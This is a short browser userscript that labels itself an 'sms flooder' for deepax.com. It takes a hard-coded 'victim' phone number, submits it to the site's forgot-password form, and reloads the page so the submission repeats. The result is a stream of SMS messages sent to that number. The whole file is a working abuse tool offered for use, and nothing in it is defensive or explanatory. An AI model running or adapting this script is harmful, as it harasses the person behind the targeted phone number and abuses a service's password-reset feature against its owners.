// ==UserScript==
// @name          Anonymous DEEPAX.com sms flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*deepax.com/*
// ==/UserScript==

var victim=8092262928//Enter victims number here

if(document.location=="http://deepax.com/forget_pass.aspx"||document.location=="http://deepax.com/forget_pass.aspx")
{
document.forms[0].elements[0].value=victim;
document.forms[0].submit();
}
if(document.location=="http://deepax.com/forget_pass.aspx"||document.location=="http://deepax.com/forget_pass.aspx")
document.location='http://deepax.com/forget_pass.aspx';